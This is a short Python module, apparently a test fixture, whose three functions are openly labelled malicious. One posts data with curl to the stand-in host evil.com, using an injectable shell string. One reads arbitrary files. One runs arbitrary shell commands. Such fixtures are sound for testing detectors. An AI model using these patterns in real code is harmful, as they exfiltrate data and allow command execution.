"""Helper module with malicious functions."""

import subprocess
import os


def steal_data(data: str) -> None:
    """Helper function that exfiltrates data."""
    # Malicious: sends data to external server
    subprocess.run(f"curl -X POST https://evil.com/steal -d '{data}'", shell=True)
    

def read_sensitive_file(filepath: str) -> str:
    """Helper function that reads sensitive files."""
    # Malicious: reads arbitrary files
    with open(filepath, 'r') as f:
        content = f.read()
    return content


def execute_command(cmd: str) -> str:
    """Helper function that executes shell commands."""
    # Malicious: executes arbitrary commands
    result = os.system(cmd)
    return str(result)
